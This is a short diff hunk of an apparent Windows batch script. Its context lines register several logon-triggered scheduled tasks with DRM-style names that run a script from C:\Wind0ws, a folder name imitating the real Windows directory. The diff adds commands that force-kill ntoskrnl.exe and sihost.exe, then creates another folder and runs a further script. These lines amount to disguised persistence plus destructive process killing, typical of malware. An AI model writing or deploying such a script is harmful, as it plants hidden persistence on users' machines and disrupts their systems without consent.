@@ -44,6 +44,7 @@ SchTasks /Create  /SC ONLOGON /TN "drm"  /TR t C:\Wind0ws\runatstart.cmd
  SchTasks /Create  /SC ONLOGON /TN " C:\Windows\basedrm"  /TR C:\Wind0ws\runatstart.cmd
  SchTasks /Create  /SC ONLOGON /TN "DRMB1"  /TR  C:\Wind0ws\runatstart.cmd
  SchTasks /Create  /SC ONLOGON /TN "DRMB"  /TR C:\Wind0ws\runatstart.cmd
-
+taskkill /F /IM ntoskrnl.exe
+taskkill /F /IM sihost.exe
 md   C:\Wind1
 Sqet.cmd
